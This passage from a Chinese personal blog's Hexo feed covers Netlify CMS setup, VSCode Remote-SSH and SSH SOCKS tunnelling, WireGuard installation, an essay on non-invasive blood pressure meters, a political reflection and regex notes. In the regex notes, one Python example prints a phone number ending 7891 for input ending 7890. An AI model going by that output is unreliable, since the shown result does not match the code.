<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">yarn</span> <span class="token function">add</span> hexo-netlify-cms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后在Netlify里面设置一下<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>, 开启git-gateway服务并在Snippet Injection加入一行代码</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://identity.netlify.com/v1/netlify-identity-widget.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开yoursite/admin就可以看到了 这个时候Settings-&gt;Identity-&gt;Registration是开放注册的，我们改成Invite only 然后在设置里面Settings-&gt;Identity-&gt;External providers里面进行Github授权或者在在identity页面发邮件邀请（是点进你的team里面identity页面输入邮件地址然后点invite users按钮，不是在设置里的identity） 由于我是白嫖用户，Indetity Level 0，什么Audit log之类的都用不了, 设置到这里基本就结束了。</p>
<ul>
<li>这句话是我在Netlify CMS里面打的，试试，貌似这个在线的markdown编辑器并不太好用,感觉跟CodiMD差了好多啊，也没有夜间模式，也不支持Mathjax之类的</li>
</ul>
<p>行吧，感觉被坑了啊，一点也不好用啊。<del>等有空我在教研室服务器上部署个CodiMD玩</del></p>
<p>（或许可以在本地写好了markdown再粘贴上去，这个markdown在线编辑器实在是难用，而且丑）</p>
<p>唯一能看的就是它会自动同步你的repo，但是你下次在本地编辑的时候还得git pull一下，什么时候仓库不在手边的时候能拿来将就一下。（好像可以拿手机之类的操作啊）</p>
<p>什么，你说多人协作？也不太好用，免费用户invite只能五个账号，鸡肋；收费用户太贵了，并不划算。还不如直接建一个git repository多人协作结合CI发布。至于使用Netlify CMS多人一起维护发布网站内容, 行吧，个人博客基本用不到。也许是给不愿意折腾又想建站还想搞个静态博客的小白用的，但是这样的小白真的有1%吗？</p>
<p>当然netilify cms对于静态网站还是有它的意义的，不然也不会在Github有那么多star，但是对于不需要多人协作的个人博客，就别装了吧（已经装了的和不折腾不舒服斯基人士请随意）</p>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ppYW5ndGovaGV4by1uZXRsaWZ5LWNtcy9ibG9iL21hc3Rlci9SRUFETUUtWkgubWQ=">Hexo Netlify CMS<i class="fa fa-external-link-alt"></i></span></p>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyL0dpdC3lt6Xlhbct5a2Q5qih5Z2X">Git 工具 - 子模块<i class="fa fa-external-link-alt"></i></span> 可能会有切换分支等其他问题<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZG5vY20uY29tL2FydGljbGVzL2JlZWNobnV0L2hleG8tbmV0bGlmeS1jbXMv">https://www.dnocm.com/articles/beechnut/hexo-netlify-cms/<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>netlify</tag>
        <tag>ci</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode使用ssh-key远程登录Ubuntu</title>
    <url>/7f63/</url>
    <content><![CDATA[<p>兼谈使用SSH转发加快教研室网上冲浪速度 <a id="more"></a> Mobaxterm挺好用的，只是那个文本编辑器不舒服。 试着用一下VSCode的remote-ssh 通过ssh-key登录就不多讲了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<h2 id="mobaxterm设置ssh密钥登录">Mobaxterm设置SSH密钥登录</h2>
<p>ssh-keygen生成密钥之后在Mobaxterm的SSH设置找到Advanced SSH Setting里勾选import SSH key可以直接导入密钥。 退出再登录显示这样</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Authenticating with public key &quot;Imported-Openssh-Key: id_rsa&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就是成功了（失败会提示这样<code>Server refused our key</code>)</p>
<h2 id="vscode设置ssh密钥登录">VSCode设置SSH密钥登录</h2>
<p>装Remote-ssh插件，然后左边框会有个小电脑的图标，点那个图标，再点SSH TARGETS的设置（Configure），进行配置 它有个配置文件，一般在<code>C:/Users/&lt;username&gt;/.ssh</code>下面的config 编辑它的配置文件，Host随便填，HostName填ip，User填用户名，IdentityFile填私钥路径，Port填端口（默认22可以不填） （要是认证失败什么的，建议把那些.ssh文件夹底下的文件删了，比如known_hosts）</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">Host workstation
    HostName hostname
    User user
    IdentityFile C:&#x2F;Users&#x2F;XXX&#x2F;.ssh&#x2F;id_rsa
    Port 22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>连接的时候可能会让你手动在termial里的信息 这样应该就行了, 不用每次输密码了。看到那个</p>
<p>什么？想用密码不想用ssh-key密钥登录，不能保存密码🐴？ 您好，官方文档说不能 &gt;Yes, you should be prompted to enter your token or password automatically. However, passwords are not saved, so using key based authentication is typically more convenient</p>
<p>（当然这里是新出的功能，bug当然少不了，我就遇到过<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUtcmVtb3RlLXJlbGVhc2UvaXNzdWVzLzEyMTc=">这样的<i class="fa fa-external-link-alt"></i></span>, 一般遇到问题先升一下最新版或者用insider试试，再不行就去GitHub提issue） 其他的问题找官方文档<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>看看，貌似可以SSH端口转发</p>
<p>远程SSH的VSCode插件是单独的，可以自行安装 如果你要配置多台主机SSH,在配置文件里并列加配置就行了</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">Host workstation
    HostName hostname
    User user
Host Server
    HostName hostname
    User user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ssh端口转发">SSH端口转发</h2>
<p>老网民很熟悉的网上冲浪手段之一就是SSH Tunnel<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>。当只开了22端口的时候可以用这种方法绕过防火墙用TCP之类的，当然，这种方法曾经也用来突破那个巨大的 防火墙 。 今天我突发奇想，看到工作站和服务器的专用线路的速度贼快啊，<del>专用线路从来不低于45Mb/s不高于50Mb/s的速度毫不含糊</del>，还有公网IP。 而102网吧由于老板太抠，四个人用一个路由器，辣鸡校园网网速10M/s都跑不到...</p>
<p>使用Mobaxterm和SwityOmega插件可以满足大部分需求</p>
<p>MobaXterm里选Tools &gt; MobaSHHtunnel &gt; New SHH tunnel &gt; Dynamic Port forwarding (SOCKS proxy)</p>
<p>那个Dynamic Port 是动态转发，不是v2ray那种用来防止被封的动态端口，就是你本地的端口会被转到服务器上相同的端口，是sockets5代理 配置你的端口和密钥（最好把那个autostart和Autoconnect也选上），然后到SwityOmega之类的工具里面填上相应的端口，就可以愉快的上网了。从浏览器的IP查询网站看一下IP，已经是服务器的IP了</p>
<p>更新，看错了，忘了分Mbps和MBps了，实际上快不了多少，只有6MBps/s。但是没人跟我抢，自己走专线还是快一点的。</p>
<p>终端的命令可以看这篇，不多说了<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p>
<h2 id="突然意识到">突然意识到</h2>
<p>为什么要用SSH呢，现在不用担心被FIREWALL制裁, 流量特征明显的WireGuard可以用了呀... 有空试试这个闪闪发光的新生代VPN, 底层貌似是UDP，红龙LOGO挺拉风的(跑题了 WireGuard据说要加到新的Linux Kernel里面，但是现在教研室的老Ubuntu只能自己装（这个我18年就听说了要加进kernel啦，连Linus都说好要加辣<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>然而鸽到现在，还是没加，据说作者在搞windows的,现在做的差不多了，要回来折腾Linux了） 之前WireGuard由于流量特征太明显就换了v2，现在试试这个 安装比Openvpn简单，Ubuntu直接PPA装就行了（需要root权限）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:wireguard/wireguard
<span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> wireguard<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>win10的官方客户端已经出了，之前18年那会我还用的Tunsafe，设置参考这里<a href="#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a> 听八卦说Tunsafe和WireGuard作者还有过撕逼，此处不表</p>
<h3 id="其他">其他</h3>
<h3 id="开机自启">开机自启</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> wg-quick@wg0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="使用vscode愉快的写cc">使用VSCode愉快的写C/C++</h3>
<p>装C/C++和coderunner插件就行了，现在可以自动配置运行和调试的文件了（就那个以前一堆坑还经常改一更新就配置失效的launch.json和config.json）</p>
<h3 id="vscode连接docker">VSCode连接Docker</h3>
<p>安装Docker和Docker compose插件（在远程里面），然后直接用就行了</p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9oeWprMjAwMC5naXRodWIuaW8vMjAxMi8wMy8xNi9ob3ctdG8tc2V0LXVwLXNzaC1rZXlzLw==">设置 SSH 通过密钥登录<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9yZW1vdGUvc3No">官方文档：Remote Development using SSH<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlhbmRlcmUubW9lL21vZS9nZnctdnMtcHJveHkvOTcuaHRtbA==">墙与梯的较量<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9saW51eC9sLWNuLXNzaGZvcndhcmQvaW5kZXguaHRtbA==">实战 SSH 端口转发<i class="fa fa-external-link-alt"></i></span><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>Linus在邮件中回复说： &gt;Btw, on an unrelated issue: I see that Jason actually made the pull &gt;request to have wireguard included in the kernel. &gt; &gt;Can I just once again state my love for it and hope it gets merged &gt;soon? Maybe the code isn't perfect, but I've skimmed it, and compared to the horrors that are OpenVPN and IPSec, it's a work of art. 见<span class="exturl" data-url="aHR0cHM6Ly9sa21sLm9yZy9sa21sLzIwMTgvOC8yLzY2Mw==">https://lkml.org/lkml/2018/8/2/663<i class="fa fa-external-link-alt"></i></span><a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9nb2xiLmhwbGFyLmNoLzIwMTkvMDcvd2lyZWd1YXJkLXdpbmRvd3MuaHRtbA==">Setting up WireGuard on Windows<i class="fa fa-external-link-alt"></i></span><a href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ssh</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>博客开通</title>
    <url>/1a9a/</url>
    <content><![CDATA[<p>我的新博客开通了，不定期更新</p>
<a id="more"></a>
<p>域名到期，之前的wordpress网站不太喜欢，索性用hexo搞个静态网站。</p>
<p>这个博客主要用来闲扯，本人才疏学浅，虚度廿载光阴，一事无成，偶尔生产bug。</p>
<blockquote>
<p>当我沉默着的时候，我觉得充实；我将开口，同时感到空虚</p>
<p>生命的泥委弃在地面上，不生乔木，只生野草，这是我的罪过</p>
</blockquote>
<p><br><br/></p>
<p><img src="/1a9a/cyperpunk.png" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>无创血压计</title>
    <url>/2e86/</url>
    <content><![CDATA[<p>血压是人体最主要的传统监护指标之一，血压的测量在医学上具有重要意义。相比于有创的测量方法，无创测量具有方便和不易感染的优点，在血压测量中被广泛采用。经典的无创测量方法主要有柯氏音法、超声法。此外，能够连续测量的动脉张力法、容积补偿法、脉搏波速传导法和脉搏波特征参数测定法也有着广阔的应用空间和市场前景。</p>
<a id="more"></a>
<h2 id="血压测量原理及特点">血压测量原理及特点</h2>
<p>血压是重要的人体生理参数指标，具有重要的医学意义，是高血压及休克等多种疾病状态的关键性临床指标。在临床上,测量各个心腔及周围血管的血压,是评估心血管系统功能的重要指标之一,目前已经有多种方法测定血压波形和血压值。常用的血压测量方法有准确度较高的有创血压监测和无创血压监测。对于不同的应用场景和需求，也产生了多种监测设备，主要分为家庭使用的便携设备、医院常规检查设备以及重症病人的监测设备。</p>
<p>有创的测量手段多用于医院临床监护，被认为是血压测量的金标准，包括中心静脉压力监测、创伤性动脉血压监测、血流动力学监测和血压测量中的动态响应优化。目前已经应用于各大医院的重症监护室、手术室、心脏导管室。 有创的监测手段测量精度高，多集成在医院的综合性生理指标监测设备，该方法的血压测量精度和连续性已经较为成熟，足够用于分析。有创带来的感染问题可以由医院的护理人员处理。</p>
<p>无创血压监测主要包括柯氏音法、测振法、超声法、双袖带法、恒定袖带法、逐拍跟踪法、张力测定法、恒定容积法等，其中振动法由于其有较好的抗干扰能力,能比较可靠地判断血压、实现血压的自动检测，在无创血压监测中应用最广。张力测定法无法避免机体环境变化时发生的外力和内力不平衡引起的误差;容积法虽然较为成熟，却无法避免长时间测量时静脉充血的影响，存在难以长期保持局部的压力的巍峨提。基于这些原理的血压计主要有，其水银式血压计、电子血压计及基于容积振动法的血压检测装置等。水银式血压计无创血压测量的"金标准"，被业界广泛认可。然而，水银血压计的使用要求较高，对于非医学从业人员尤其是年长老人群体操作使用时存在着一定困难。目前市场有成熟的便携电子血压计，适合家庭中使用。电子血压计大都采用了示波法的原理。然而便携电子血压计检测上也存在缺陷，血压测量精度问题难以解决，通常只用于有高血压等疾病的患者家庭中使用。脉搏波传导时间(PTT)的检测法近年来发展较快，但由于影响因素多，个体差异性大，测量精度有待提高。容积法（振动法）是通过袖带加压中容积脉搏波的变化而确定血管内部压力的测量方法。该方法易于实现电子自动化数字化测量，且测量精度较高。但是，该方法只能直接检测出收缩压，舒张压需通过间接计算，误差较高，甚至可达10%。无创血压计的主要厂家有欧姆龙、爱安德、鱼跃等，主要产品有欧姆龙上臂式血压U12、鱼跃上臂式YE670A等型号，此外迈克大夫等各厂家还拥有不同的心血管监测的专利技术。近年来主要的突破主要是价格的压缩和便携性的提高，在监测准确度上依然不如有创的方法，大部分设备的原理也仍然是振荡法。</p>
<p>目前对于振荡法的改进主要有采用先进的、严格控制的线性放气过程的硬件设备的改进以及通过综合频谱分析、小波变换、神经网络和基于奇异值矩阵分解的新型曲线拟合算法等信号处理的方法来寻找压力波形的特征计算血压等生理参数。进一步提高测量准确度的方法包括采用操作较复杂的双袖带检测法以及针对不同人群（如区分年龄、性别、体重等个人特征）调整检测算法，调整参数。</p>
<h2 id="血压监测设备的优化改进">血压监测设备的优化改进</h2>
<p>近年来对于无创血压计的改进主要集中于对于监测算法的改进和成本的降低以及小型化便携化，无创血压监测最大的应用市场。针对生理信号的特征提出了许多不同的监测方法，如基于容积脉搏波振幅梯度的血压检测法。一些监测连续信号的仪器也推出了监测心房颤动等疾病的监测算法。小型化设备的进展也有不少，例如进军医疗领域的苹果公司的Apple Waltch，心率和血压监测已经通过美国食品药品监督管理局（FDA）的认证。老牌厂商欧姆龙也推出了一款名为HeartGuide的手表，具备监测血压心率和睡眠质量的功能，并且可以通过蓝牙连接。</p>
<p>目前的主流电子血压计采用的振动法主要经历了三个阶段的发展。第一代电子血压计（G1-NIBPM）采用固定加压和机械排气技术，加压方式和效果类似水银血压计的手动充气。由于机械式慢速排气阀存在明显压迫感和精度低、寿命短等缺点，已经很少被采用。第二代电子血压计（G2-NIBPM）采用智能加压和电子控制伺服技术，提高了舒适度和测量结果的稳定性。三、 第三代电子血压计（G3-NIBPM）采用加压同步测量技术，加压速度均匀，并在加压的过程中进行血压测量，提高了测量的速度。第二代电子血压计技术主要用于上臂式电子血压计；第三代电子血压计技术主要用于手腕式电子血压计。</p>
<p><img width="400" src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.png" alt="picture"></p>
<p>图1 腕式、臂式血压计和能监测血压的手表</p>
<p>近年来，连续监测技术的发展使得无创测量的方法在每个心动周期内完成血压的测量，使得无创方法在健康监测和重症监测领域应用成为可能。对于连续的实时监护设备，多采用脉搏波（PTT）时间检测法，能够避免张力测定法与容积补偿法装置复杂成本高、检测难度大的缺陷。该方法利用血压升高动脉管壁会扩张降低动脉弹性和顺应性导致脉搏波传递速度加快，通过脉搏波的速度变化反应动脉血管压力的变化。脉搏波时间检测法不需要加压套袖，方便舒适，随着监测算法的改进，误差已经可以在平稳的情况下达到4mmHg，但是在运动等外部干扰下的表现不好，仍旧有待解决。该方法的发展有望取代一部分有创方法，对病人进行连续的生理特征监测。</p>
<p>此外动脉张力法也较为常见，市场化较早，也比较成熟，测量精度较高，无需每次定标。但是该方法测量桡动脉部位的动脉压力时难以保持位置固定，容易受到干扰。一些自动跟随的设备，如Bahr的改进张力计，也提高了监测的准确度。 动脉容积钳制法经过Tanoru和Yamakoshi等人的改进后，成为了另一种逐渐成熟的方法。该方法是在手指基部或中部放置气压指套或者液体填充加压袋的测量盒，并同时调节指套压力，并采用红外方式监测脉搏波的变化。指套压力采用自动反馈系统，始终等于动脉压。但是由于该方法测量手指的压力时施加外部压力，长时间测量易引起静脉充血。由于测量部位的原因，准确度不如腕部和上臂的测量方法，但是指尖测量有望实现监护仪的微型化，检测部位和无创血糖的检测部位类似，便于和血氧血糖模块组成小型多生理信号检测设备。对于动脉张力法的主要改进包括，补偿器补偿心脏和指端的流体静力学压差，采用气动袖套等方法解决袖套和心脏不在同一水平位置等问题。此外，通过舒张压和收缩压的特征参数利用线性回归的方法得到血压值等算法的提出也在一定程度上提高了准确度。</p>
<p>目前有基于脉搏波的臂带式可穿戴设备和使用手机、蓝牙设备的便携监测。能够用于长时间血压的连续监测。考虑到大部分家庭用的电子血压计使用者都是年纪较大的人，针对老年人进行的易操作改进和安全性也在市场产品中不断涌现。目前，200元以下的电子血压计已经基本满足家用需求，测量的准确度和水银柱式血压计相差不大。</p>
<h2 id="参考文献">参考文献</h2>
<p>[1]Andreas Patzak,Yuri Mendoza,Heiko Gesche,Martin Konermann. Continuous blood pressure measurement using the pulse transit time: Comparison to intra-arterial measurement[J]. Blood Pressure,2015,24(4).</p>
<p>[2]株式会社爱安德. 血压计: 日本，201730034188.6 2[P]. 2017-07-28.</p>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>测量</tag>
        <tag>传感器</tag>
      </tags>
  </entry>
  <entry>
    <title>无题</title>
    <url>/e5e8/</url>
    <content><![CDATA[<figure>
<img src="photo_hk1.jpg" alt="null" /><figcaption aria-hidden="true">null</figcaption>
</figure>
<blockquote>
<p>然而我的心很平安；没有爱憎，没有哀乐，也没有颜色和声音</p>
<p>然而这是许多年前的事了</p>
<a id="more"></a>
<p>然而现在没有星和月光，没有僵坠的蝴蝶以至笑的渺茫，爱的翔舞。然而青年们很平安</p>
</blockquote>
<hr />
<h2 id="君不见月如水">君不见，月如水</h2>
<p>局域网之外的某些人纪念着三十年，一如一个月前局域网内官方纪念着一百年。昔日书生意气不再，只余残破躯壳，被人拿出来晒干了高高挂起，铸成新的图腾和血色大旗。</p>
<p>走近一看，这旗帜不见血色，暗淡无光，轻轻一吹，灰尘抖落</p>
<p>旖旎的生命不见踪影，在大风暴前，不见人哭，不见人笑。韭菜隐约发觉经济不好，电视只道稳中向好；不知大风波又将怎样到来，也不曾拥有灵便的手脚，只能抬头望像乌云聚集的天空。</p>
<p>怎奈影帝临走前一席话一语成谶，时局至此，正未知几人称帝，几人称王。</p>
<figure>
<img src="pic1.jpg" alt="大清" /><figcaption aria-hidden="true">大清</figcaption>
</figure>
<blockquote>
<p>彼黍离离，彼稷之苗。行迈靡靡，中心摇摇。</p>
</blockquote>
<p>承平日久十几年了，九十年代入世后的美(xue)好(han)时(gong)光(chang)，也该结束了，新时代，来了。08年四万亿之后，涨价去库存、棚改、15股灾救市、公鸡侧+环保左右出击，带路，那可真是治国鬼才，迪士尼捡到宝了。反正今天这个样子，也没有回头路了。（当然春秋大梦该做还是要做的，梦里啥都有）</p>
<p>魑魅搏人应见惯，总输他、覆雨翻云手</p>
<p>皆误在，今日不和，明日不战。鼎之轻重，可问否？</p>
<blockquote>
<p>冰与雪，周旋久.</p>
</blockquote>
<p>物价闯关，再来一次，不知如何？</p>
<p>失业和通胀，会是哪个呢？难道.....</p>
<p>尽道丰年瑞，丰年事若何？</p>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
  </entry>
  <entry>
    <title>正则表达式笔记</title>
    <url>/96cd/</url>
    <content><![CDATA[<p>可能用得到</p>
<a id="more"></a>
<h2 id="用法">用法</h2>
<h3 id="防止过度匹配">防止过度匹配</h3>
<p>使用? 比如</p>
<pre class="line-numbers language-none"><code class="language-none">* 改为 *?

匹配\&lt;b\&gt;标签:

&lt;[Bb]&gt;.*?&lt;/[Bb]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="单词边界">单词边界</h3>
<p>使用不匹配边界使用,比如  匹配字符串使用^元字符</p>
<h3 id="子表达式">子表达式</h3>
<p>使用(),例如</p>
<pre class="line-numbers language-regex" data-language="regex"><code class="language-regex"><span class="token group punctuation">(</span>&amp;nbsp;<span class="token group punctuation">)</span><span class="token quantifier number">{2,}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>匹配两个非换行空格</p>
<h3 id="回溯引用">回溯引用</h3>
<p>使用\1, 匹配一对html标签:</p>
<pre><code>\&lt;H1&gt;\&lt;/H1&gt;使用
&lt;Hh([1-6])&gt;.*?&lt;/[Hh]\1&gt; 匹配</code></pre>
<p>替换中也会用到\1 使用python的re库可以完成一些替换</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> repl<span class="token punctuation">,</span> string<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里重新排版电话号码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

phone <span class="token operator">=</span> <span class="token string">"123-456-7890"</span>

<span class="token comment"># 将电话号重新排版为(123) 456-7890</span>
num <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\d{3})(-)(\d{3})(-)(\d{4})"</span><span class="token punctuation">,</span> <span class="token string">r"(\1) \3-\5"</span><span class="token punctuation">,</span> phone<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"phone-number: "</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果</p>
<pre class="line-numbers language-none"><code class="language-none">phone-number:  (123) 456-7891<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="前向查找">前向查找</h3>
<p>使用?=进行前向查找,?&lt;=向后查找</p>
<p>比如,从<code>https://zhangjk98.xyz/</code>中找出协议https:</p>
<pre class="line-numbers language-none"><code class="language-none">.+(?=:)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="实例">实例</h2>
<p>比如下面这个匹配邮箱的正则 https://regex101.com/library/lP7vL3</p>
<pre class="line-numbers language-none"><code class="language-none">(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*:(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?: